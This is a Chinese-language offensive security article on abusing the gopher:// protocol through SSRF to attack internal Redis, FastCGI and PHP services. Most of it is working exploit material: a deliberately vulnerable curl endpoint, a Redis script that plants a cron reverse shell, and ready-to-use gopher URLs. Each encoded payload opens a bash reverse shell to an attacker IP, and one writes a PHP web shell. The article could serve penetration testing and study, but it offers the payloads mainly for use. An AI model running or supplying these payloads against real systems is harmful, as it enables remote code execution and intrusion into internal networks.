# Do Evil Things with gopher://

0x00 前言
=======

* * *

Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。但是经过部分测试，发现阿里云的 libcurl 还是支持 Gopher 协议的，在实际环境中可能会有更多。

Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。

最大化利用 SSRF，将一个鸡肋漏洞玩的的淋漓尽致的例子也有，比如：[WooYun-2016-213982：bilibili某分站从信息泄露到ssrf再到命令执行](http://wooyun.org/bugs/wooyun-2016-0213982)

0x01 环境
=======

* * *

*   IP: 172.19.23.218
*   OS: CentOS 6

根目录下 1.php 内容为：

```
<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET["url"]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
$output = curl_exec($ch);
curl_close($ch);
?>

```

0x02 攻击内网 Redis
===============

* * *

Redis 任意文件写入现在已经十分受到广大渗透狗们的欢迎，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。

首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：

```
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save

```

利用这个脚本攻击自身并抓包得到数据流：

![](http://drops.javaweb.org/uploads/images/99329e6728d88e207940c4cd9aa89300e658d6a8.jpg)

改成适配于 Gopher 协议的 URL：

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

```

攻击：

![](http://drops.javaweb.org/uploads/images/ff6000014d4b5c4a961a3bdfa93cc7497439620f.jpg)

0x03 攻击 FastCGI
===============

* * *

一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。

首先构造 exp：

![](http://drops.javaweb.org/uploads/images/87156c4a375abfbcc215b11e91bd405af4c70b54.jpg)

构造 Gopher 协议的 URL：

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00

```

攻击：

![](http://drops.javaweb.org/uploads/images/73b9373a96fb0db68ab633d16a88db2f62cf580b.jpg)

0x04 攻击内网 Vulnerability Web
===========================

* * *

Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。  
一个只能 127.0.0.1 访问的 exp.php，内容为：

```
<?php system($_POST[e]);?>  

```

利用方式：

```
POST /exp.php HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.43.0
Accept: */*
Content-Length: 49
Content-Type: application/x-www-form-urlencoded

e=bash -i >%26 /dev/tcp/172.19.23.228/2333 0>%261

```

构造 Gopher 协议的 URL：

```
gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i >%2526 /dev/tcp/172.19.23.228/2333 0>%25261null

```

攻击：

![](http://drops.javaweb.org/uploads/images/e9c14857e40056cc9a8b63be1e5de4928ae74a49.jpg)

0x05 以上
=======

* * *

Gopher + SSRF 组合拳还有更多的姿势等待挖掘，水平有限，抛砖引玉。

0x06 参考
=======

* * *

*   [Gopher (protocol)](https://en.wikipedia.org/wiki/Gopher_(protocol))
*   [redis 远程命令执行 exploit (不需要flushall)](http://zone.wooyun.org/content/23858)
*   [PHP FastCGI 的远程利用](http://zone.wooyun.org/content/1060)